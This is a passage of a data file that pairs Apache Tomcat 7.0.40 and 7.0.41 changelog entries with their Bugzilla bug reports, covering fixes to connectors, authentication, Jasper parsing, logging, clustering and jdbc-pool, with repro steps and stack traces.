- Write a message to the response explaining why the 400 response was returned. This would make it much easier for application deployers to determine the cause of the non-functional application.

- Have a default logger setup for the AJP connector and change the log level to INFO. Perhaps this gets treated as a one time warning and the first request that hits this limit is logged as WARN and the subsequent requests are logged at DEBUG to avoid log clutter.

- Increase the default value of maxHeaderCount to 1000 which would more easily accommodate the use of HTTP headers to pass user attributes.



I'd be happy to provide a patch for any of these solutions or other proposed ideas."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54939
Catalina|Tomcat 7.0.41 (markt)|add|54944|Enhancements to the unit tests for FORM authentication. Patch provided by Brian Burch. (markt)|Enhancements to TestFormAuthenticator|"Created attachment 30266 [details]
svn diff: update to test class

I have attached an extensive patch to this existing test class. The main benefit is better comments and self-documenting arguments to the common worker methods, which should be helpful to anyone investigating tomcat authentication behaviour but who does not have a detailed understanding of its internal logic.

The motive and techniques used here bring the source into line with an earlier enhancement to the TestNonLoginAndBasicAuthenticator, i.e. https://issues.apache.org/bugzilla/show_bug.cgi?id=54190#c4

All tests should pass with the latest trunk. Code style should be acceptable."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54944
Catalina|Tomcat 7.0.41 (markt)|fix|54955|When a reload of the application is performed ensure that a subsequent request to the context root does not result in a 404 response. (violetagg)|Mapping to application context root returns 404 after reload|"Created attachment 30273 [details]
A minimum war file to reproduce the bug with sources attached

URL mapping specified as """"(empty string) maps a servlet to the context root according to servlet specification. This feature is working when an application is deployed, but broken when it's reloaded. A reload will result in 404 error. (Other url mappings are OK, only """")

Steps to reproduce:

1) Create a servlet with URL mapping as empty string, you can either use @WebServlet("""") annotation or <url-pattern></url-pattern> in web.xml

2) If you deploy it in Tomcat 7.0.40, it will work. (e.g. http://localhost:8080/myapp/) 

3) But if you reload the app (say using the manager app), http://localhost:8080/myapp/ will give 404 error. Servlet in step 1 is never called this time.

Actual Results: 404 Not Found

Expected Results: Show the context root page.

Env: Tomcat 7.0.40, Java 7, Windows 8"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54955
Catalina|Tomcat 7.0.41 (markt)|fix|54971|Ensure that the correct location is used when writing files via javax.servlet.http.Part.write(String). (markt)|javax.servlet.http.Part.write(String fileName) is not properly implemented|"1. fileName parameter / relative vs absolute
filaName parameter specification in
<1><JSR-000315 Java Servlet 3.0 Final Release javadocs>
is different from the <2><javax API tomcat refers to>.

<1> <JSR-000315 Java Servlet 3.0 Final Release javadocs>

Parameters:fileName - the name of the file to which the stream will be written. The file is created relative to the location as specified in the MultipartConfig

<2> javax. API tomcat refers to

 * @param fileName  The location into which the uploaded part should be
     *                  stored. Relative locations are relative to {@link
     *                  javax.servlet.MultipartConfigElement#getLocation()}


Tomcat is implemented as specified in <2> so that it can process ""absolute path"",
but it should only accept ""relative path"" as specified in <1>
<JSR-000315 Java Servlet 3.0 Final Release javadocs>

2.
If MultiPartConfig.location is not set,
write( String relative path ) throws FileNotFound Exception.
A default location needs to be set in order to avoid such exception.

example) os: windows8

part.write(""/test"");

java.io.IOException: java.io.FileNotFoundException: \test (Access is denied)
	at org.apache.catalina.core.ApplicationPart.write(ApplicationPart.java:123)
	at servlet.multipart.MultipleUploadServlet.doPost(MultipleUploadServlet.java:76)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:647)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:947)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1009)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:589)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)
	at java.lang.Thread.run(Thread.java:662)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54971
Catalina|Tomcat 7.0.41 (markt)|fix|54974|Ensure that SessionCookieConfig#set<methods> will throw IllegalStateException if the ServletContext from which this SessionCookieConfig was acquired has already been initialized. (violetagg)|SessionCookieConfig.setXXX methods must throw IllegalStateException when invoked after initialization phase|"According to Servlet 3.0 javadoc 
javax.servlet.SessionCookieConfig setter methods must throw IllegalStateException when invoked after initialization phase

setComment(String) 
setDomain(String)
setHttpOnly(boolean)
setMaxAge(int)
setName(String) 
setPath(String)
setSecure(boolean)

""
Throws: java.lang.IllegalStateException - if the ServletContext from which this SessionCookieConfig was acquired has already been initialized
"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=54974
Catalina|Tomcat 7.0.41 (markt)|fix|54981|Ensure that ServletContext#getJspConfigDescriptor() will return null when there is no jsp configuration provided by web.xml/web-fragment.xml. (violetagg)|ServletContext.getJspConfigDescriptor() should return null when there is no jsp configuration|"According to Servlet 3.0 javadoc ServletContext.getJspConfigDescriptor() must return NULL when there is no jsp configuration:

""
Returns:
the <jsp-config> related configuration that was aggregated from the web.xml and web-fragment.xml descriptor files of the web application represented by this ServletContext, or null if no such configuration exists
"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=54981
Catalina|Tomcat 7.0.41 (markt)|fix||Ensure that when Tomcat's anti-resource locking features are used that the temporary copy of the web application and not the original is removed when the web application stops. (markt)|||
Catalina|Tomcat 7.0.41 (markt)|fix|54984|Use the correct encoding when processing a form data posted as multipart/form-data even when the request parameters are not parsed. (violetagg)|multipart/form-data is not always read with correct encoding|"The bug occurs when form data is posted as multipart/form-data and using Servlet 3 API to get posted files.
In a servlet, if we set the encoding:

request.setCharacterEncoding(""UTF-8"");

Then invoke:

request.getParts()

And then invoke:

String text = request.getParameter(""sometextfield"");

UTF-8 characters in the text have been garbled.

Order of method calls are significant, if a getParameter is called before getParts, the correct encoding will be used.
However, the order which you invoke the methods should not matter."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54984
Catalina|Tomcat 7.0.41 (markt)|fix|54999|The old JSESSIONIDSSO needs to be removed when SSO is being used and logout() and login() occur within a single request. Patch provided by Keith Mashinter. (markt)|JSESSIONIDSSO not re-created upon re-authentication on the same request - logout() and login(username,password)|"In testing I found that the JSESSIONIDSSO was not re-created upon re-authentication via logout() and login(username,password) in the same request.  The problem stemmed from the REQ_SSOID_NOTE that was was not reset upon request.logout(), whereas the documentation indicates that a logout() from any web-app should logout() from all web-apps.  When the REQ_SSOID_NOTE is not removed upon logout(), a subsequent login(username,password) on the same request will re-create a JSESSIONID for the current web-app but fails to re-create a JSESSIONIDSSO since the REQ_SSO_ID_NOTE still lingers on the request.

AuthenticatorBase.java adjustment for logout(request) that removes the REQ_SSOID_NOTE so that a subsequent login(username,password) will work on the same request:

    @Override
    public void logout(Request request) throws ServletException {
        register(request, request.getResponse(), null,
                null, null, null);
    	request.removeNote(Constants.REQ_SSOID_NOTE);
    }

I'll upload a diff-patch against the trunk and for 7.0.40."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54999
Catalina|Tomcat 7.0.41 (markt)|add|55035|Add support for the version attribute to the deploy command of the Ant tasks for interfacing with the text based Manager application. Patch provided by Sergey Tcherednichenko. (markt)|Deploy ROOT webapp with version through text manager using Ant|"Currently Ant ""deploy"" task does not support separate parameter ""version"" and, thanks to URLEncoder, there is no workaround for that.

But for apps with not empty context it's possible to define version using ##, like setting path to ""/someContext#someVersion"".

For apps with empty context we receive error:

Case #1:
<deploy url=""{tomcat.manager}/text"" username=""${username}"", password=""${password}"" path=""/ROOT##12345"" war=""${pathtowar}"" />

Result:
Failed to deploy application at context path /ROOT##12345

Case #1:
<deploy url=""{tomcat.manager}/text"" username=""${username}"", password=""${password}"" path=""/##12345"" war=""${pathtowar}"" />

Result:
Failed to deploy application at context path /##12345"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55035
Catalina|Tomcat 7.0.41 (markt)|add|55046|Add a Servlet Filter that implements CORS. Patch provided by Mohit Soni. (markt)|CORS Filter|"Created attachment 30363 [details]
A patch file containing CORS filter source code, units tests, and changes to tomcat documentation's filter.xml.

CORS Filter implementation

This is an enhancement request to include CORS Filter as one of Tomcat's container provided filters.

CORS (Cross Origin Resource Sharing) is a W3C specification (http://www.w3.org/TR/cors/) that defines a mechanism to enable cross origin requests. This is a Java Servlet Filter implementation of server-side CORS.

Here are few reasons that makes this implementation is a good fit:
* Implements all required sections of the spec for servers. Handles simple/actual and pre-flight requests as per the specification.
* Written specifically to fit well with Tomcat's source, and is formatted the same as Tomcat's source.
* Filter implementation is just one class and is well Javadoc'd
* Includes ample unit tests to validate the implementation against the spec
* Simple to configure minimally and use
* Easy to override default configuration, if required
* Protects against CRLF injection / response splitting attacks.

We(eBay) would like to contribute this implementation to Apache Software
Foundation, to be included in Tomcat 8. And, I would also like to maintain and develop it, going forward. 

It's true that as a Servlet Filter, any webapp developer may add it to their app whether Tomcat includes it or not, but we believe that this is fundamental server behavior that should be present and easy to enable in the server, as it is in some other servers."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55046
Catalina|Tomcat 7.0.41 (markt)|add|55052|JULI's LogManager now additionally looks for logging properties without prefixes if the property cannot be found with a prefix. (markt)|[JULI] Make ClassLoaderLogManager.getProperty() to try unprefixed property if prefixed one does not exist|"The following issue was reported by ""Edson"" via comments system at
http://tomcat.apache.org/tomcat-7.0-doc/logging.html

[quote]
I would like to have a section explaining how to use SimpleFormatter.format, because I can't make log behave as expected when using JULI. Seems that Tomcat always ignore my attemps - unless I set in catalina.sh the system property: -Djava.util.logging.SimpleFormatter.format=""[%1$tY-%1$tm-%1$td %1$tH:%1$tM:%1$tS.%1$tL] %4$s: %5$s %6$s %n"" Would this be clarified in documentation?
[/quote]

I am confirming this behaviour with with the current Tomcat 7.0.x (7.0.40) and JDK 7u21.

Actual:
=======
If add the following line to logging.properties logging output does not change, as reported in the comment:

[[[
java.util.logging.SimpleFormatter.format=[%1$tY-%1$tm-%1$td %1$tH:%1$tM:%1$tS.%1$tL] %4$s: %5$s %6$s %n
]]]

But, if I add the following line, the output changes for all handlers. (At least for the console one, catalina.DATE.log and localhost.DATE.log files. Other log files are empty by default).

[[[
1catalina.java.util.logging.SimpleFormatter.format=[%1$tY-%1$tm-%1$td %1$tH:%1$tM:%1$tS.%1$tL] %4$s: %5$s %6$s %n
]]]

Problem:
========
Oracle's SimpleFormatter.format is a static field, an thus is initialized only once.  While it is good that prefixed ""1catalina.*"" property works, this specific formatter cannot be configured per-handler. (One is free to implement their own formatter that does not use a static field there, or file an enhancement request to Oracle or OpenJDK).

The code in question is ClassLoaderLogManager.getProperty(String) which does

[[[
        if (prefix != null) {
            name = prefix + name;
        }
]]]

Thus is a prefix is active it tries only prefixed value of a property and never tries an unprefixed one.

Expected:
=========

With SimpleFormatter it would be more sense to configure it using an unprefixed property, regardless of which Handler is initialized first.

Workaround
===========
Change the values of ""handlers"", "".handlers"" properties so that an unprefixed handler is listed first.

In the default configuration that will be ConsoleHandler:

[[[
handlers = java.util.logging.ConsoleHandler, 1catalina.org.apache.juli.FileHandler, 2localhost.org.apache.juli.FileHandler, 3manager.org.apache.juli.FileHandler, 4host-manager.org.apache.juli.FileHandler

.handlers = java.util.logging.ConsoleHandler, 1catalina.org.apache.juli.FileHandler
]]]

Alternatively, you can remove a prefix from one of other handlers.

If you do so, and if that handler uses a SimpleFormatter, then the unprefixed configuration property will work:
[[[
java.util.logging.SimpleFormatter.format=[%1$tY-%1$tm-%1$td %1$tH:%1$tM:%1$tS.%1$tL] %4$s: %5$s %6$s %n
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=55052
Catalina|Tomcat 7.0.41 (markt)|fix||Ensure that only the first asynchronous dispatch operation for a given asynchronous cycle will be performed. Any subsequent asynchronous dispatch operation for the same asynchronous cycle will be ignored and IllegalStateException will be thrown. (violetagg)|||
Coyote|Tomcat 7.0.41 (markt)|fix|54947|Fix the HTTP NIO connector that incorrectly rejected a request if the CRLF terminating the request line was split across multiple packets. Patch by Konstantin Prei√üer. (markt)|Http11NioProtocol generates HTTP 505 responses on valid requests if request is split across multiple packets|"If an HTTP request is broken up across multiple packets *and* the first packet contains a GET request up to ""\r"" AND the ""\n"" terminating the first line of the request is included in the next packet Tomcat incorrectly throws an HTTP ""505 Version Not Supported"" response.  This is with the Http11NioProtocol connector only - the default HTTP/1.1 connector does not exhibit this problem.

An example request:
Packet 1: GET / HTTP/1.1\r
Packet 2: \nHost: localhost\r\n
Packet 3: Connection: Close\r\n\r\n

Response:
HTTP/1.1 505 HTTP Version Not Supported
Server: Apache-Coyote/1.1
Date: Thu, 09 May 2013 20:23:58 GMT
Connection: close

The following Python program reproduces the problem for me in both Tomcat 6.0.37 and Tomcat 7.0.39:
""""""
#!/usr/bin/python

import socket
import time

s = socket.socket()
s.connect((""localhost"",8080))
s.sendall(""GET / HTTP/1.1\r"")
time.sleep(1.5) # make sure the above goes out in its own packet
s.sendall(""\nHost: localhost\r\n"")
s.sendall(""Connection: close\r\n\r\n"")
print s.makefile().read()
""""""

Moving the ""\n"" to from the second sendall to the end of the first sendall causes Tomcat to respond correctly."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54947
Jasper|Tomcat 7.0.41 (markt)|fix|54964|Allow tag plug-ins to be packaged with a web application. Patch provided by Sheldon Shao. (markt)|"Class loading issue of ""TagPlugin"" in TagPluginManager"|"Created attachment 30281 [details]
Patch for TagPluginManager.java

TagPluginManager is using ""Class.forName"" to load extensions of TagPlugin.
It can't work when these extensions are put under the WEB-INF/lib.

Here is the code,

            String pluginClassStr = pluginClassNode.getBody();
            TagPlugin tagPlugin = null;
            try {
                Class<?> pluginClass = Class.forName(pluginClassStr);
                tagPlugin = (TagPlugin) pluginClass.newInstance();
            } catch (Exception e) {
                throw new JasperException(e);
            }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54964
Jasper|Tomcat 7.0.41 (markt)|fix|54968|Return the correct version number (2.2) of the JSP specification that is supported by the JSP engine when javax.servlet.jsp.JspEngineInfo#getSpecificationVersion() is invoked. (violetagg)|JspEngineInfo.getSpecificationVersion() returns 2.1 instead of 2.2||https://bz.apache.org/bugzilla/show_bug.cgi?id=54968
Cluster|Tomcat 7.0.41 (markt)|add||Add maxValidTime attribute to prevent the leak of FileMessageFactory in FarmWarDeployer. (kfujino)|||
Cluster|Tomcat 7.0.41 (markt)|code||Simplify the code of ReplicationValve: Rather than get cluster instance from container on every request, use instance variable. (kfujino)|||
Cluster|Tomcat 7.0.41 (markt)|add||Add maxWait attribute that the senderPool will wait when there are no available senders. (kfujino)|||
Cluster|Tomcat 7.0.41 (markt)|add||Improve error message by including specified timeout if failed to retrieve a data sender. (kfujino)|||
Cluster|Tomcat 7.0.41 (markt)|add||Add removeSuspectsTimeout attribute in order to remove a suspect node in TcpFailureDetector. (kfujino)|||
Web applications|Tomcat 7.0.41 (markt)|fix|54931|Add information to the Window Service how-to about installing and running multiple instances. Based on a patch by Chris Derham. (markt)|Updates to windows-service-howto to include support for installing multiple windows services|"Created attachment 30257 [details]
Diff file for windows-service-howto

The existing documentation does not explain how to use service.bat to install multiple services on windows. I attach a diff which makes changes that I suggest as included. The diff updates existing entries to include explanation of the 2nd service parameter which allows a service to be named, and creates a new section that explains how to install multiple services."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54931
Web applications|Tomcat 7.0.41 (markt)|fix|54932|Correct the link to Tribes documentation. (violetagg)|Broken link to Tribes documentation|"1. Go to  http://tomcat.apache.org/tomcat-7.0-doc/

2. In the menu at the left of the page, scroll down to ""Apache Tomcat Development"" section and click on ""Tribes"" link

3. The browser navigates to
http://tomcat.apache.org/tomcat-7.0-doc/tribes/index.html
which gives error 404 ""Not Found"".

The issue is that
- there is no ""index.html"" in Tribes section
- there are pages there, but all they except one are empty, containing only header and ""TODO"" marker
- the correct link (and the only valuable page there) is:
http://tomcat.apache.org/tomcat-7.0-doc/tribes/introduction.html

Alternatively, linking to
http://tomcat.apache.org/tomcat-7.0-doc/tribes/
will provide a listing of all pages in that directory on the server."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54932
Web applications|Tomcat 7.0.41 (markt)|add||Add document for o.a.c.tribes.group.interceptors.TcpFailureDetector. (kfujino)|||
Catalina|Tomcat 7.0.40 (markt)|update||Update Tomcat's internal copy of Commons FileUpload to FileUpload 1.3. (markt)|||
Catalina|Tomcat 7.0.40 (markt)|fix||54178, CVE-2013-2071: Protect against AsyncListener implementations that throw RuntimeExceptions in response to an event. (markt)|[CVE-2013-2071] runtime exception in onComplete of AsyncListener, will make org.apache.catalina.connector.Request not recycled (orginally reported MESSAGE POST to tomcat, but it called doGet)|"one HTTP request use POST method, but in tomcat it calls doGet() what is really strage.

as I only tested in 7.0.23, and 7.0.32. in 7.0.32, 7.0.32 is more reproduceable than 7.0.23.

I know it must be a very strange issue, as tomcat has so many release. I can't believe it if I didn't see it with my own eyes.

so I attache the image."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54178
Catalina|Tomcat 7.0.40 (markt)|fix|54791|Restore tools.jar entry in jarsToSkip property to prevent warnings when running Tomcat from Eclipse. (markt)|No TLD files were found in tools.jar when tools.jar is explicitly added to $CLASSPATH|"Since r1448831 (7.0.39) tools.jar is no longer mentioned in jarsToSkip

Steps to reproduce
1. Use Eclipse IDE, version for JavaEE developers.
I am using 3.7.2 (Indigo SR2) here.

2. Configure it to use a JDK.

3. Configure a new Server from Tomcat 7.0.39
In Java EE perspective, go to Servers view, right-click, choose ""New -> Server"" from context menu.

4. Examine launch configuration of the server.
In Servers view click on the server instance. A new page opens in Editor area. Click on ""Open launch configuration"" link there. Go to ""Classpath"" tab.

Note that the following JARs are in the classpath:
* bootstrap.jar
* tomcat-juli.jar
* tools.jar

5. Deploy a web application on this server and start it.
If you have configured logging (with -Djava.util.logging.config.file in the same launch configuration dialog), you may see complaints that there are no TLDs in tools.jar.


02-Apr-2013 18:24:39.637 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet Engine: Apache Tomcat/7.0.39
(...)
02-Apr-2013 23:08:54.355 FINE [tc-http-2] org.apache.jasper.compiler.TldLocationsCache.tldScanJar No TLD files were found in [file:/C:/Program%20Files/Java/jdk1.6.0_43/lib/tools.jar]. Consider adding the JAR to the tomcat.util.scan.DefaultJarScanner.jarsToSkip or org.apache.catalina.startup.TldConfig.jarsToSkip property in CATALINA_BASE/conf/catalina.properties file.



There are two ways to fix this
a) add ""tools.jar"" to jarsToSkip property
b) do not scan jars in classpath.


In r1448831 in StandardJarScanner.java this b) would be
replace
  stopLoader = ClassLoader.getSystemClassLoader().getParent();
with
  stopLoader = ClassLoader.getSystemClassLoader();

I see a problem with such a change, though.

I think that there is no need to scan SystemClassLoader's classpath when Tomcat is launched via Bootstrap class.

I think that we have to scan SystemClassLoader's classpath when launched in embedded mode via Tomcat class. Is is because it does not set up classloaders hierarchy like it is done by Bootstrap."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54791
Catalina|Tomcat 7.0.40 (markt)|fix|54851|When scanning for web fragments, directories without any web-fragment.xml should not impact the status of distributable element. Patch provided by Trask Stalnaker. (violetagg)|Folder without web-fragment.xml should not impact the status of distributable|"Created attachment 30200 [details]
patch

revision 889701 ""JARs without any web.xml fragments should not impact the status of distributable"" was applied to scan(JarURLConnection jarConn), but was not applied to scan(File file).

I ran into this while trying to run cluster nodes from inside eclipse/wtp which supplies some folders to WebappClassLoader.addRepository(), e.g. <another workspace project>/classes.

This causes the app to be marked as distributable=false, regardless of supplying the <distributable/> tag in the web.xml.

The attached patch resolved the issue for me. Thanks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54851
Catalina|Tomcat 7.0.40 (markt)|fix||When an error occurs during the sending of a WebSocket message, notify the Inbound side (where all the events occur that the application reacts to) that an error has occurred and that the connection is being closed. (markt)|||
Catalina|Tomcat 7.0.40 (markt)|fix|54906|Better error message if a ConcurrentModificationException occurs while checking for memory leaks when a web application stops. Also ensure that the exception does not cause remaining checks to be skipped. Based on a patch by NateC.|WebappClassLoader.loadedByThisOrChild can throw ConcurrentModificationException|"Created attachment 30240 [details]
Patch to catch ConcurrentModificationException while iterating over a collection

This is related to bug 54497. A common exception seen in 7.0.33 during stop is a ConcurrentModification in loadedByThisOrChild.

java.util.concurrent.ExecutionException: org.apache.catalina.LifecycleException: Failed to stop component [StandardEngine[Tomcat].StandardHost[localhost].StandardContext[/mobile/login/oauth]]
	at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:252)
	at java.util.concurrent.FutureTask.get(FutureTask.java:111)
	at org.apache.catalina.core.ContainerBase.stopInternal(ContainerBase.java:1179)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1575)
	at org.apache.catalina.core.ContainerBase$StopChild.call(ContainerBase.java:1564)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:722)
Caused by: org.apache.catalina.LifecycleException: Failed to stop component [StandardEngine[Tomcat].StandardHost[localhost].StandardContext[/mobile/login/oauth]]
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:236)
	... 7 more
Caused by: org.apache.catalina.LifecycleException: Failed to stop component [WebappLoader[/mobile/login/oauth]]
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:236)
	at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5521)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	... 7 more
Caused by: java.util.ConcurrentModificationException
	at java.util.Vector$Itr.checkForComodification(Vector.java:1156)
	at java.util.Vector$Itr.next(Vector.java:1133)
	at org.apache.catalina.loader.WebappClassLoader.loadedByThisOrChild(WebappClassLoader.java:2599)
	at org.apache.catalina.loader.WebappClassLoader.checkThreadLocalMapForLeaks(WebappClassLoader.java:2515)
	at org.apache.catalina.loader.WebappClassLoader.checkThreadLocalsForLeaks(WebappClassLoader.java:2455)
	at org.apache.catalina.loader.WebappClassLoader.clearReferences(WebappClassLoader.java:1996)
	at org.apache.catalina.loader.WebappClassLoader.stop(WebappClassLoader.java:1902)
	at org.apache.catalina.loader.WebappLoader.stopInternal(WebappLoader.java:661)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	... 9 more

The fix for 54497 stops the exception from failing the stop but it still fails the rest of the ThreadLocal leak check. It would be better if ConcurrentModificationException was caught in loadedByThisOrChild and only that one check fails."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54906
Catalina|Tomcat 7.0.40 (markt)|fix||Allow 204 responses (no content) to include entity headers as required by RFC2616. (markt)|||
Coyote|Tomcat 7.0.40 (markt)|fix||Ensure write errors when using HTTP Upgrade with the APR/native connector result in IOExceptions rather than errors being silently swallowed. (markt)|||
Jasper|Tomcat 7.0.40 (markt)|fix|54802|Provide location information for exceptions thrown by JspDocumentParser. (kkolinko)|Provide location information for exceptions thrown by JspDocumentParser [PATCH]|"Steps to reproduce - see bug 54801

It causes an exception to be thrown by
org.apache.jasper.compiler.JspDocumentParser.checkScriptingBody()

The issue is that the exception in bug 54801 does not provide any information on the file where it occurred. It does not show in which tag file it happened, and thus it is hard to follow.

There are four places in JspDocumentParser where it throws a ""SAXException"" without any location information.  I propose to replace

  throw new SAXException(msg);

with

  throw new SAXParseException(msg, locator);

I am not sure that line numbers will be correct in all four cases, but at least it will provide the name of the file. This is better than nothing."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54802
Jasper|Tomcat 7.0.40 (markt)|fix|54801|Do not attempt to parse text that looks like an EL expressions inside a scriptlet in a JSP document because EL expressions are not permitted in scriptlets. (kkolinko/markt)|EL-like expressions in jsp:scriptlet break compilation of JSP XML documents|"Created attachment 30152 [details]
helloWorld.tagx

Steps to reproduce:

1. Go to  webapps\examples\WEB-INF\tags\
2. Delete ""helloWorld.tag"" file and put there ""helloWorld.tagx"" file attached to this issue.
The file contains the following plus AL header:

<?xml version=""1.0"" encoding=""utf-8"" ?>
<jsp:root xmlns:jsp=""http://java.sun.com/JSP/Page"" version=""2.0"">
<jsp:scriptlet><![CDATA[//
  // ${foo}
  out.println(""Hello, world!!"");
]]></jsp:scriptlet>
</jsp:root>

3. Start Tomcat and try to open the following page in a browser:
http://localhost:8080/examples/jsp/jsp2/tagfiles/hello.jsp

ACTUAL result:
in current TC8 trunk:
org.xml.sax.SAXException: Body of scriptlet element must not contain any XML elements
  org.apache.jasper.compiler.JspDocumentParser.checkScriptingBody(JspDocumentParser.java:1332)
  org.apache.jasper.compiler.JspDocumentParser.endElement(JspDocumentParser.java:650)
	

This behaviour is caused by ""${foo}"" being present inside the scriptlet. If I remove that line, the page is displayed successfully.

EXPECTED RESULT
I think EL expressions should not be recognized inside of jsp:scriptlet, jsp:declaration or jsp:expression and should not trigger such an error.

As a confirmation, the following ""helloWorld.tag"" in JSP syntax compiles and executes successfully. Thus this issue is with XML syntax only,

<%
  // ${foo}
%>
Hello, world!++


Alternative solution could be to change the error message, but I think it is not the issue here,
s/ any XML elements / any XML elements or EL expressions/"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54801
Jasper|Tomcat 7.0.40 (markt)|fix|54821|Do not attempt to parse text that looks like an EL expressions in a JSP document if EL expressions have been disabled. (kkolinko/markt)|Error trying to parse EL in JSP XML documents when isELIgnored = true|"I noted this issue while reviewing code for bug 54801.
Reproducible with current 7.0 = 7.0.39.

Steps to reproduce:
1. Put the attached ""page3.jspx"" and ""page4.jspx"" files into examples webapp.

Page 3:
<jsp:root xmlns:jsp=""http://java.sun.com/JSP/Page"" version=""2.0"">
<jsp:directive.page isELIgnored=""true""/>
${Hello, world!!}
</jsp:root>

Page 4:
<jsp:root xmlns:jsp=""http://java.sun.com/JSP/Page"" version=""2.0"">
<jsp:directive.page isELIgnored=""true""/>
${Hello, world!!
</jsp:root>

2. Start Tomcat
3. Access http://localhost:8080/examples/page3.jspx
This works as expected and prints ""${Hello, world!!}""

4. Access http://localhost:8080/examples/page4.jspx
This fails with error 500,

org.apache.jasper.JasperException: /page4.jspx (line: 21, column: 12) Unterminated ${ tag

* root cause *:
org.xml.sax.SAXParseException: Unterminated ${ tag
org.apache.jasper.compiler.JspDocumentParser.processChars(JspDocumentParser.java:538)
org.apache.jasper.compiler.JspDocumentParser.endElement(JspDocumentParser.java:610)
com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.endElement(AbstractSAXParser.java:601)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54821
Jasper|Tomcat 7.0.40 (markt)|fix|54888|Add support for CSV lists with the ForEach tag plugin. Patch provided by Sheldon Shao. (markt)|"TagPlugin ""ForEach"" doesn't support CSV items"|"Created attachment 30225 [details]
Patch for ""ForEach""

In JSTL, ""forEach"" supports items with String value.
The string can be a CSV format. For example,

<c:foreach items=""1,2,3,4,5"" var=""i""></c:foreach>

However, it doesn't support in tagPlugin ""ForEach"".

Provided a patch for this issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54888
Cluster|Tomcat 7.0.40 (markt)|fix||Add several improvements for FarmWarDeployer. (kfujino)|||
Web applications|Tomcat 7.0.40 (markt)|fix|54872|Correct Cluster Receiver page of Tomcat documentation. (violetagg)|"Receiver's value of autoBind is ""less than"", not ""not greater than"""|"/tomcat-7.0-doc/config/cluster-receiver.html :

In the section ""Attributes -- Common Attributes"", the description of Attribute ""port"" is slightly diffrent to the facts.

It says ""port &lt;= bindPort &lt;= port+autoBind"", but this should be written 
""port &lt;= bindPort &lt; port+autoBind"".
And ""port in the range 4000-4100."" also shoud be written ""port in the range 4000-4099.""

For example, I try (port=4000, and autoBind=10), then the receiver tried to open port in the range of 4000-4009. It didn't try port 4010."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54872
jdbc-pool|Tomcat 7.0.40 (markt)|update||Document StatementCache interceptor. (kkolinko)|||
jdbc-pool|Tomcat 7.0.40 (markt)|fix||Fix minor threading issue in ConnectionPool. (markt/kkolinko)|||
jdbc-pool|Tomcat 7.0.40 (markt)|fix|54732|Fix leak of statements in StatementCache interceptor. (kkolinko)|StatementCache interceptor does not forward calls to Statement.close() which causes memory leaks|"ML ref: http://mail-archives.apache.org/mod_mbox/tomcat-users/201303.mbox/browser

When using Tomcat's jdbc-pool with the StatementCache interceptor (the default for TomEE 1.5.1), the actual java.sql.Statement.close() method is not called on the Statements. This causes severe memory leaks, at least with the MySQL driver.

I see what could be a bug in StatementCache#closeInvoked() which is called by the above method. Here is the code with my own comments added:
@Override
public void closeInvoked() {
    boolean shouldClose = true;
    if (cacheSize.get() < maxCacheSize) {
        // omitted for brievety
    }
    closed = true;
